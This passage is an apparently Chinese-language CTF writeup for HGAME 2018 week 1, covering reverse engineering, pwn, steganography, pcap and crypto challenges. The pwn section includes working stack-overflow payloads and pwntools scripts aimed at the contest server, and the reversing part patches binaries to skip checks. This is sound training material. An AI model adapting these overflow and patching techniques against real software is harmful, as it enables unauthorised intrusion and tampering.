class="number">0xB2</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0xCE</span>, <span class="number">0x80</span>, <span class="number">0x20</span>, <span class="number">0x1C</span>, <span class="number">0x7C</span>, <span class="number">0x07</span>, <span class="number">0xE2</span>, <span class="number">0xB9</span>, <span class="number">0x91</span>, <span class="number">0x45</span>, <span class="number">0x74</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0xF5</span>, <span class="number">0x3E</span>, <span class="number">0x03</span>, <span class="number">0xC4</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x2B</span>, <span class="number">0x48</span>, <span class="number">0x27</span>, <span class="number">0xE6</span>,</span><br><span class="line">    <span class="number">0x5B</span>, <span class="number">0xF4</span>, <span class="number">0x9C</span>, <span class="number">0x88</span>, <span class="number">0x75</span>, <span class="number">0xA2</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xD1</span>, <span class="number">0xE5</span>, <span class="number">0x4D</span>, <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0x9E</span>, <span class="number">0x58</span>, <span class="number">0xA3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// func3_reserve():</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">            <span class="keyword">if</span> (trans_table[j] == <span class="built_in">array</span>[i]) &#123;</span><br><span class="line">                <span class="built_in">array</span>[i] = j;</span><br><span class="line">                <span class="comment">// 查表还原出原来的值</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 有坑，不 break 的话会拿到错误的下标</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// func2_reverse():</span></span><br><span class="line">    <span class="keyword">int</span> v1 = <span class="number">15</span>, v2 = <span class="number">21</span>, v3 = <span class="number">7</span>;</span><br><span class="line">    <span class="comment">// 推一下就能知道上边这些最终值，然后逆着回去就行</span></span><br><span class="line">    <span class="keyword">while</span> (v2 &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        v2 -= --v3;</span><br><span class="line">        v1 = v2 - (v3 - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 让 v1 成为下一轮的 v2，也就是原来 v1 = v2 的逆操作</span></span><br><span class="line">        <span class="keyword">uint8_t</span> temp = <span class="built_in">array</span>[v1];</span><br><span class="line">        <span class="built_in">array</span>[v1] = <span class="built_in">array</span>[v2];</span><br><span class="line">        <span class="built_in">array</span>[v2] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//func1_reserve():</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> mod = i &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (mod == <span class="number">0</span>) &#123;</span><br><span class="line">            buffer[i] = <span class="built_in">array</span>[i] / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">// 这里不会得到浮点数的，array[i] 肯定是偶数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            buffer[i] = (<span class="built_in">array</span>[i] &gt;&gt; <span class="number">2</span>*mod) | (<span class="built_in">array</span>[i] &lt;&lt; <span class="number">8</span> - <span class="number">2</span>*mod);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　Flag：hctf{U_g0t_Tr1foRce}</p>
+<h3 id="nop-pop-100"><a href="#nop-pop-100" class="headerlink" title="nop_pop [100]"></a>nop_pop [100]</h3><p>　　第一次遇到文件里没有 Flag 的题，迷茫……了解到我需要做什么之后，先打开该程序，弹出两个窗口，我需要把背景图去掉，观察发现该图窗口名为 <code>pop team epic</code>。遂丢进 OllyDbg，搜索定位到该字符串：</p>
+<p><img src="/images/writeup-of-hgame-week1/re3.png" alt="re3"></p>
+<p>　　下断点后执行到该处，发现先后调用了 <code>CreateWindowExW()</code>、<code>ShowWindow()</code> 跟 <code>UpdateWindow()</code>，那只要把 <code>ShowWindow()</code> 给 nop 掉即可。栈里多出来的数据没有影响，也不会让 <code>UpdateWindow()</code> 出现没有操作对象的情况：</p>
+<p><img src="/images/writeup-of-hgame-week1/re3-1.png" alt="re3-1"></p>
+<p>　　继续将代码读下去，发现有一小段不会执行的代码：</p>
+<p><img src="/images/writeup-of-hgame-week1/re3-2.png" alt="re3-2"></p>
+<p>　　将跳转条件反转即可：jnz -&gt; jz，保存后发给客服获得 Flag：hctf{Far5we1L_G0od_Cr4cker}</p>
+<h3 id="sc2-player-100"><a href="#sc2-player-100" class="headerlink" title="sc2_player [100]"></a>sc2_player [100]</h3><p>　　不带符号让人迷茫，搜索字符串，通过“Input your flag”的 xref 找到了主函数：</p>
+<p><img src="/images/writeup-of-hgame-week1/re4.png" alt="re4"></p>
+<p>　　其中，if 的判断条件明显是判断上边一系列运算的正确与否，跟进去：</p>
+<p><img src="/images/writeup-of-hgame-week1/re4-1.png" alt="re4-1"></p>
+<p>　　先继续跟进子函数：</p>
+<p><img src="/images/writeup-of-hgame-week1/re4-2.png" alt="re4-2"></p>
+<p>　　读完发现大概就是 <code>!strcmp()</code>，结合 <code>check()</code> 那几个按位与，可以知道，只有 <code>a1, a2, a3, a4</code> 与 <code>mask2</code> 相对应的部分完全相同，<code>check()</code> 才会返回真。</p>
+<p>　　然后层层深入一下 <code>f1()</code> 函数。经过整理，其作用相当于下面的伪代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">f1</span><span class="params">(buffer, mask, loc, id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; ++i)</span><br><span class="line">        loc[i] = mask[i + <span class="number">7</span>*id] ^ (i + <span class="number">35</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; ++i)</span><br><span class="line">        mask[i] = mask[i + <span class="number">7</span>*id] ^ <span class="number">0x34</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; ++i)</span><br><span class="line">        loc[i] = buffer[i + <span class="number">7</span>*id] ^ (i + <span class="number">7</span>*id) ^ id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>　　因为最终拿来比对的是 <code>loc</code> 们，只要跟踪好 <code>loc</code> 的变化即可：第一个循环给 <code>loc</code> 做的改变都被第三个循环给覆盖了，而第三个循环对 <code>loc</code> 的改变只与 <code>buffer</code> 有关，第二个循环与 <code>loc</code> 一点关系都没有。可以发现，<code>loc</code> 的最终内容可直接由 <code>buffer</code> 得出，<code>mask</code> 什么的都可以统统抛弃。</p>
+<p>　　而传给 <code>check()</code> 的 <code>mask2</code> 未曾被改变过，只被拿来比对。借由 <code>mask2</code> 的数据，可以知道所有 <code>loc</code> 的最终数据，并通过上边的式子从 <code>loc</code> 反推 <code>buffer</code> 即可。Flag：hctf{M4y_th5_iDa_gu1de_thee}，最终代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> buffer[<span class="number">5</span>][<span class="number">7</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// 多一行拿来放空字符 =。=</span></span><br><span class="line"><span class="keyword">uint8_t</span> loc[<span class="number">4</span>][<span class="number">7</span>] = &#123;</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x62</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x7F</span>, <span class="number">0x48</span>, <span class="number">0x32</span>,</span><br><span class="line">    <span class="number">0x7F</span>, <span class="number">0x56</span>, <span class="number">0x7C</span>, <span class="number">0x63</span>, <span class="number">0x3F</span>, <span class="number">0x52</span>, <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x6C</span>, <span class="number">0x4D</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0x73</span>, <span class="number">0x4A</span>, <span class="number">0x60</span>, <span class="number">0x73</span>, <span class="number">0x7F</span>, <span class="number">0x7C</span>, <span class="number">0x65</span>,</span><br><span class="line">&#125;;  <span class="comment">// 这个就是 mask2 的数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// f1s_reserve():</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; ++i)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">6</span>; j&gt;=<span class="number">0</span>; --j)</span><br><span class="line">            buffer[i][j] = loc[i][j] ^ ((j + <span class="number">7</span>*i) ^ i);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="{ Pwn }"></a>{ Pwn }</h2><h3 id="guess-number-50"><a href="#guess-number-50" class="headerlink" title="guess_number [50]"></a>guess_number [50]</h3><p>　　先手动 nc 一下，发现是要猜数字。既然是要猜数字，猜想可以通过随机数种子拿到随机的数字。先在 IDA 里 F5 拿到 C 代码：</p>
+<p><img src="/images/writeup-of-hgame-week1/pwn1.png" alt="pwn1"></p>
+<p>　　种子的播种应该在 <code>init()</code> 函数里，跟进去：</p>
+<p><img src="/images/writeup-of-hgame-week1/pwn1-1.png" alt="pwn1-1"></p>
+<p>　　发现用的是系统提供的 <code>/dev/urandom</code>，无法操作，放弃挣扎。回到 <code>main()</code> 里继续读代码，没有发现问题，继续跟进 <code>guess_num()</code> 函数：</p>
+<p><img src="/images/writeup-of-hgame-week1/pwn1-2.png" alt="pwn1-2"></p>
+<p>　　第九行用 <code>scanf(&quot;%s&quot;)</code> 的方式读入，敲定此处有溢出的风险。只要成功将 <code>goal_random_num</code> 覆盖即可，查看该函数的栈空间：</p>
+<p><img src="/images/writeup-of-hgame-week1/pwn1-3.png" alt="pwn1-3"></p>
+<p>　　发现 <code>goal_random_num</code> 在相对 <code>buffer</code> 的高地址处，说明此方法可行。构造 payload：<code>python3 -c &quot;print(&#39;0&#39;*276+&#39;\x00\x00\x00\x00\n&#39;)&quot; | nc 111.230.149.72 10002</code>，即可成功获得 Flag：hgame{S0unds_L1ke_U_KN0wn_h0w_st4ck_works}</p>
+<h3 id="flag-server-50"><a href="#flag-server-50" class="headerlink" title="flag_server [50]"></a>flag_server [50]</h3><p>　　(该题初版可根据随机数种子不够随机(timestamp)的漏洞得到生成的随机数，下边是根据溢出所做的题解)</p>
+<p><img src="/images/writeup-of-hgame-week1/pwn2.png" alt="pwn2"></p>
+<p>　　读代码：先初始化随机数生成器，没有搞头，继续：输入长度 length，去除过长 length，防止溢出。然后通过 <code>read_n()</code> 读入指定长度的字符，遇到回车或长度已满的时候结束读入。如果要拿到 Flag，就必须使 <code>is_admin</code> 为真。</p>
+<p>　　这时候有两条路，一条是走 <code>username == &quot;admin&quot;</code> 并猜到随机数。但是随机数种子拿不到，在生成之后、判断之前也无法覆盖掉这个数：</p>
+<p><img src="/images/writeup-of-hgame-week1/pwn2-1.png" alt="pwn2-1"></p>
+<p>　　所以考虑另外一条路：直接在前边将 <code>is_admin</code> 覆盖成为真。该题有三处输入，<code>scanf(&quot;%u&quot; 与 &quot;%d&quot;)</code> 都无法覆盖到其他地方的数据，只剩 <code>read_n()</code> 有可能。进去之后仔细阅读代码：</p>
+<p><img src="/images/writeup-of-hgame-week1/pwn2-2.png" alt="pwn2-2"></p>
+<p>　　联系之前“loading”的 hint，发现没有考虑 <code>i</code> 为负数的情况，而且正好可以通过 <code>i &lt;= 63</code> 的限制。手动 nc 输入 -1 验证一下，发现可以成功覆盖到 <code>is_admin</code>，所以可以构造 payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'111.230.149.72'</span>, <span class="number">10001</span>)</span><br><span class="line">conn.recvuntil(<span class="string">'length: '</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">conn.send(<span class="string">'-1\n'</span>)</span><br><span class="line">conn.recvuntil(<span class="string">'username?'</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">conn.send(<span class="string">'@'</span> * <span class="number">68</span> + <span class="string">'\n'</span>)</span><br><span class="line"><span class="comment"># 让 is_admin 非零即可</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<p>　　即可成功获取 Flag：hgame{Be_c4r3fu1_wHile_u5ing_1nt_And_unsigned_1nt}</p>
+<h3 id="zazahui-50"><a href="#zazahui-50" class="headerlink" title="zazahui [50]"></a>zazahui [50]</h3><p><img src="/images/writeup-of-hgame-week1/pwn3.png" alt="pwn3"></p>
+<p>　　<code>main()</code> 函数就几行代码，先设置无缓冲，然后依次调用两个函数。先跟进第一个函数：</p>
+<p><img src="/images/writeup-of-hgame-week1/pwn3-1.png" alt="pwn3-1"></p>
+<p>　　此函数把 <code>ad</code> 和 <code>Flag</code> 的内容读入到 .bss 段特定地址，那看来待会要修改某个指针的值以指向放在内存里的 Flag。再看一下第二个函数：</p>
+<p><img src="/images/writeup-of-hgame-week1/pwn3-2.png" alt="pwn3-2"></p>
+<p>　　念 100 次是没用的←_←读下去，发现只有一处 <code>read_n()</code> 可供输入。该函数内容跟上题一致，就是已经限定了最大长度为 188。本以为这唯一的入口没法溢出了，不过在查看栈空间时发现，188 已经超过了 <code>buffer</code> 实际所占有的长度 176：</p>
+<p><img src="/images/writeup-of-hgame-week1/pwn3-3.png" alt="pwn3-3"></p>
+<p>　　那么只要将 <code>ptr_ad</code> 的值给覆盖成 .bss 里储存 <code>Flag</code> 的地址即可。构造 payload 如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'111.230.149.72'</span>, <span class="number">10003</span>)</span><br><span class="line">conn.recvuntil(<span class="string">'&gt; '</span>, drop=<span class="keyword">True</span>)</span><br><span class="line">conn.send(<span class="string">'@'</span> * <span class="number">176</span> + p32(<span class="number">0x0804a060</span>) + p32(<span class="number">100</span>) + <span class="string">'\n'</span>)</span><br><span class="line"><span class="comment"># p32(100) 是为了让 times != 0，否则无法获得 Flag。</span></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>
+<p>　　Flag：hgame{y0u_c4n_4lso_s3nd_unprint4ble_ch4r}</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="{ Misc }"></a>{ Misc }</h2><h3 id="白菜1-50"><a href="#白菜1-50" class="headerlink" title="白菜1 [50]"></a>白菜1 [50]</h3><p>　　先丢到 binwalk 跑一番：</p>
+<p><img src="/images/writeup-of-hgame-week1/misc1.png" alt="misc1"></p>
+<p>　　刚开始以为这个 zlib 有猫腻，谷歌后发现是 PNG 的正常组成部分，初步排除图种。所以我就把图片拖进 Stegsolve 继续分(瞎)析(试)。谷歌了常见隐写术之后，在 Row, LSB First, R0 G0 B0 参数下看到了 ZIP 文件头，Save Bin 并打开生成的压缩包，成功拿到 Flag：hgame{4246a2158c280cdd1e8c18c57e96095f}</p>
+<h3 id="白菜2-50"><a href="#白菜2-50" class="headerlink" title="白菜2 [50]"></a>白菜2 [50]</h3><p>　　binwalk 显示后边还有个 zip，用 <code>binwalk -eM misc2.jpg</code> 分离出文件后，得到 Flag：hgame{af2ab981a021e3def22646407cee7bdc}</p>
+<h3 id="pcap1-50"><a href="#pcap1-50" class="headerlink" title="pcap1 [50]"></a>pcap1 [50]</h3><p>　　将该文件用 Wireshark 打开，搜索字符串“flag”，发现一个 GET 请求：</p>
+<p><img src="/images/writeup-of-hgame-week1/misc3.png" alt="misc3"></p>
+<p>　　在下边的 Response 里将 gzip 解开即可得到 Flag：hgame{bfebcf95972871907c89893aa3096ec6}</p>
+<p><img src="/images/writeup-of-hgame-week1/misc3-1.png" alt="misc3-1"></p>
+<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="{ Crypto }"></a>{ Crypto }</h2><h3 id="easy-Caesar-50"><a href="#easy-Caesar-50" class="headerlink" title="easy Caesar [50]"></a>easy Caesar [50]</h3><p>　　题目很清晰，找到一个解密凯撒的网站(<a href="http://tools.matchzones.net/caesar_cipher)，在向下移位" target="_blank" rel="noopener">http://tools.matchzones.net/caesar_cipher)，在向下移位</a> 12 字符的时候看到了 <code>hgame{The_qu8ck_br7wn_1x_jUmps_ovEr_a_La9y_dOg}</code>，直接提交发现出错，便根据语义将数字也移一下位，得到最终 Flag：<code>hgame{The_qu1ck_br0wn_4x_jUmps_ovEr_a_La2y_dOg}</code></p>
+<h3 id="Polybius-50"><a href="#Polybius-50" class="headerlink" title="Polybius [50]"></a>Polybius [50]</h3><p>　　读完给的链接，把密文整理了一下，发现对应 12345 的可能就是 ADFGX，谷歌之，从 <a href="https://zh.wikipedia.org/wiki/ADFGVX%E5%AF%86%E7%A2%BC" target="_blank" rel="noopener">https://zh.wikipedia.org/wiki/ADFGVX%E5%AF%86%E7%A2%BC</a> 拿到对应的字母布局。一个个对照过去，提交后发现不对。……中间省略一大堆不明所以的操作……最后联想到，在那个按照字母顺序的的版本里，I 跟 J 是放一起的（这个“联想”我等了四天才等到= =）。于是我转换了一下 I 跟 J，以及大小写，终于得到最终 Flag：hgame{fritz_nebel_invented_it}（谷歌也刚好有 Fritz Nebel 这个人）</p>
+<h3 id="Hill-50"><a href="#Hill-50" class="headerlink" title="Hill [50]"></a>Hill [50]</h3><p>　　既然题目把加密方式跟密钥都讲了出来，我就直接找工具了←_←找到这个 <a href="http://www.practicalcryptography.com/ciphers/hill-cipher/#javascript-example-of-the-hill-cipher" target="_blank" rel="noopener">http://www.practicalcryptography.com/ciphers/hill-cipher/#javascript-example-of-the-hill-cipher</a> 将密文跟密钥拖进去得到 Flag：hgame{overthehillx}</p>
+<h3 id="confusion-100"><a href="#confusion-100" class="headerlink" title="confusion [100]"></a>confusion [100]</h3><p>　　一看就觉得是摩尔斯电码，解密得到 <code>MRLTK6KXNVZXQWBSNA2FSU2GGBSW45BSLAZFU6SVJBNDAZSRHU6Q====</code>，发现以四个 = 结尾，怀疑是 base32。再次解密得到 <code>dW5yWmsxX2h4YSF0ent2X2ZzUHZ0fQ==</code>，符合 base64 的特点，又可得到 <code>unrZk1_hxa!tz{v_fsPvt}</code>。初步怀疑是栅栏密码，但是密文有 { } h a 这几个字符，却没有 g m e，怀疑是 rot13，得到 <code>haeMx1_ukn!gm{i_sfCig}</code>。接着用栅栏解密得到最终 Flag：hgame{Mix_1s_fuCking!}</p>
+<h3 id="baby-step-66"><a href="#baby-step-66" class="headerlink" title="baby step [66]"></a>baby step [66]</h3><p>　　得到 hint 之后，以 “baby step ctf” 为关键词在谷歌搜到了这个网页：<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete_log/discrete_log_intro.html#id8" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/discrete_log/discrete_log_intro.html#id8</a> ，得知此类问题可用 “baby step - giant step” 算法解决。找了几篇介绍如何实现的文章之后，自己写了一段 Py 脚本，直接把字典当 Hash 表，发现极其慢。在群里大佬提示下，去 <a href="https://sagecell.sagemath.org/" target="_blank" rel="noopener">https://sagecell.sagemath.org/</a> 跑了一下现学现卖的三行 Sage，跑出第一个数：0x2c7de99911，其中“E9”明显不是可见字符。又经过群里大佬提示，发现了第二个符合要求的数：0x7831333337，所以得到 Flag：x1337</p>
+<p>　　Sage 代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = Mod(0x1111111111, 0x976693344d)</span><br><span class="line">b = Mod(0x7ac21f64ed, 0x976693344d)</span><br><span class="line">bsgs(a, b, (0x2c7de99911 + 1, 0x7f7f7f7f7f))</span><br></pre></td></tr></table></figure></p>
+<p>　　Python 代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ans = hex(<span class="number">0x7831333337</span>)[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">print(<span class="string">''</span>.join([</span><br><span class="line">    chr(int(ans[i:i+<span class="number">2</span>], base=<span class="number">16</span>)) \</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(ans), <span class="number">2</span>)</span><br><span class="line">]))</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="../../index.html">Home</a></li>
+         
+          <li><a href="../../about/">About</a></li>
+         
+          <li><a href="../../archives/">Writing</a></li>
+         
+          <li><a href="http://github.com/probberechts">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">{ Web }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Are-you-from-Europe-100"><span class="toc-number">1.1.</span> <span class="toc-text">Are you from Europe? [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#special-number-100"><span class="toc-number">1.2.</span> <span class="toc-text">special number [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#can-u-find-me-50"><span class="toc-number">1.3.</span> <span class="toc-text">can u find me? [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#tell-me-what-you-want-100"><span class="toc-number">1.4.</span> <span class="toc-text">tell me what you want [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#我们不一样-100"><span class="toc-number">1.5.</span> <span class="toc-text">我们不一样 [100]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">2.</span> <span class="toc-text">{ Re }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#re0-50"><span class="toc-number">2.1.</span> <span class="toc-text">re0 [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-crack-100"><span class="toc-number">2.2.</span> <span class="toc-text">baby_crack [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nop-pop-100"><span class="toc-number">2.3.</span> <span class="toc-text">nop_pop [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sc2-player-100"><span class="toc-number">2.4.</span> <span class="toc-text">sc2_player [100]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">3.</span> <span class="toc-text">{ Pwn }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#guess-number-50"><span class="toc-number">3.1.</span> <span class="toc-text">guess_number [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag-server-50"><span class="toc-number">3.2.</span> <span class="toc-text">flag_server [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zazahui-50"><span class="toc-number">3.3.</span> <span class="toc-text">zazahui [50]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">{ Misc }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#白菜1-50"><span class="toc-number">4.1.</span> <span class="toc-text">白菜1 [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#白菜2-50"><span class="toc-number">4.2.</span> <span class="toc-text">白菜2 [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pcap1-50"><span class="toc-number">4.3.</span> <span class="toc-text">pcap1 [50]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">{ Crypto }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-Caesar-50"><span class="toc-number">5.1.</span> <span class="toc-text">easy Caesar [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Polybius-50"><span class="toc-number">5.2.</span> <span class="toc-text">Polybius [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hill-50"><span class="toc-number">5.3.</span> <span class="toc-text">Hill [50]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#confusion-100"><span class="toc-number">5.4.</span> <span class="toc-text">confusion [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-step-66"><span class="toc-number">5.5.</span> <span class="toc-text">baby step [66]</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://oyiadin.github.io/2018/writeup-of-hgame-week1/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&text=HGAME Week1 Writeup"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&title=HGAME Week1 Writeup"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&is_video=false&description=HGAME Week1 Writeup"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HGAME Week1 Writeup&body=Check out this article: http://oyiadin.github.io/2018/writeup-of-hgame-week1/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&title=HGAME Week1 Writeup"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&title=HGAME Week1 Writeup"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&title=HGAME Week1 Writeup"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&title=HGAME Week1 Writeup"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://oyiadin.github.io/2018/writeup-of-hgame-week1/&name=HGAME Week1 Writeup&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
